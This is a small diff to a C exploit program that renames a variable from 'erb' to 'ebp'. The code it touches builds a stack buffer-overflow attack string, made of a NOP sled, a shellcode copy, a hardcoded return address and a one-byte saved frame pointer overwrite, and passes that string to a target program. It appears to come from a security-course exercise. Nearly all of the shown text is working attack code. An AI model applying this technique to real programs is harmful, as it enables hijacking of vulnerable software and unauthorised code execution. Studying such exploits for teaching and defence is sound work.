@@ -15,11 +15,11 @@ int main(void)
   char attack[size];
   memset(attack, 0x90, size);
 
-  char erb[] = "\x70";
+  char ebp[] = "\x70";
   char ret[] = "\xd0\xfc\xff\xbf";
   memcpy(attack + (size - 50), shellcode, 45);
   memcpy(attack + (size - 5), ret, 4);
-  memcpy(attack + (size - 1), erb, 1);
+  memcpy(attack + (size - 1), ebp, 1);
 
   args[0] = TARGET; args[1] = attack; args[2] = NULL;
   env[0] = NULL;
